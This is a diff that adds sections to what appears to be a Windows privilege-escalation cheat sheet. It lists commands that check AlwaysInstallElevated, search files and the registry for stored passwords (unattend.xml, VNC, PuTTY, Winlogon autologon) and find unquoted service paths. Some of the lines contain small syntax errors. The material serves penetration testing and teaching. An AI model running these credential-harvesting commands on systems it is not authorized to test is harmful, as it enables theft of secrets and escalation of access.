@@ -637,6 +637,46 @@ sc qc [service_name] (to verify!)
 sc start [service_name]
 ```
 
+### AlwaysInstallElevated MSI
+
+```csharp
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+### Stored Credentials: Windows
+
+```csharp
+c:\unattend.xml
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+dir c:\*vnc.ini /s /b
+dir c:\*ultravnc.ini /s /b 
+dir c:\ /s /b | findstr /si *vnc.ini
+
+findstr /si password *.txt | *.xml | *.ini
+findstr /si pass *.txt | *.xml | *.ini
+
+# Windows Autologon
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+# Putty
+reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+# Registry
+reg query HKLM /f password /t REG_SZ /s 
+reg query HKCU /f password /t REG_SZ /s
+```
+
+### Unquoted Service Path
+
+```csharp
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+
 ### Creating Persistence
 
 ```csharp
